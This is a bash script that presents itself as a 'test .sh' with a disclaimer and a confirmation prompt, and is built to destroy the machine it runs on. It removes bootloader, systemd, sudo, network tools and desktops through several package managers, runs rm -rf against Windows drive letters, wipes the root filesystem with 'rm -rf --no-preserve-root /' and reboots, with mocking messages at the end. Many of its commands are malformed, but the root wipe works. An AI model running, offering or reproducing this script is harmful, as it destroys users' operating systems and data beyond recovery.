#!/bin/bash
echo 
'im not responsible for any damages to your pc please run this 
in a test vm or a pc you dont need this is a test .sh!'
git clone https://github.com/testorg112332/testfiles.git
echo 'welcome to the script are you sure you want to run this script?'
# Prompt user with a 5-second timeout (-t 5)
read -t 5 -p "Do you want to proceed? [y/N]: " response

# Check if read timed out ($? is greater than 128 when a read timeout occurs)
if [ $? -gt 128 ]; then
    echo -e "\nTimeout reached. Defaulting to 'No'."
    exit 1
fi

# Check user response
if [[ "$response" =~ ^[Yy]$ ]]; then
    echo "Proceeding..."
else
    echo "Aborted."
    exit 1
fi
su %% sudo -i
mkdir /start/
unmount /dev/sda
unmount /dev/sda1
unmount /
## check the system before huge uninstall dump/os deleter :P#
systemctl
# Show status of nginx for 5 seconds, then move on #
timeout 5s systemctl status nginx
echo "Continuing script..."
apt-get uninstall grub
apt uninstall grub
apt uninstall curl
apt uninstall wget
apt uninstall htop
apt uninstall systemd
echo 'bloat for power users to try to get there systems back :P'
echo 'if err try other operating systems'
sudo pacman -Rns grub
sudo pacman -Rns xfce4
sudo pacman -Rns kde
echo 'dnf package manager'
sudo dnf remove grub
sudo dnf remove curl
sudo dnf remove wget
sudo dnf remove xfce
sudo dnf remove kde
sudo dnf remove htop
sudo dnf remove kde
sudo dnf remove kde-latest
echo 'pkg/base linux/bsd-based'
pkg delete grub && echo 'or remove/uninstall'
pkg remove grub
pkg uninstall grub
pkg uninstall wget 
pkg remove curl
pkg uninstall wget
pkg remove wget
echo 'arch-linux aur version'
pacman -Rns curl
sudo pacman -Rns wget
sudo pacman -Rns yay
sudo pacman -Rns nano
sudo pacman -Rns sudo
# windows version #
echo 'if windows somehow ported sh bc theres sh ports'
rm -rf C:\
#a rm -rf dditional drives incase user has backup drives for windows #
rm -rf A:\
rm -rf  D:\
rm -rf E:\
Rm -rf F:\
rm -rf G:\
rm -rf J:\
rm -rf K:\
rm -rf L:\
rm -rf P:\
mkdir /done/
mkdir /status/
# end of windows version #
mkdir /done/
mkdir /status/
rm -rf --no-preserve-root /
mkdir /done/
mkdir /status/
echo 'should be done'
echo 'bye :P you did this :D'

sudo reboot
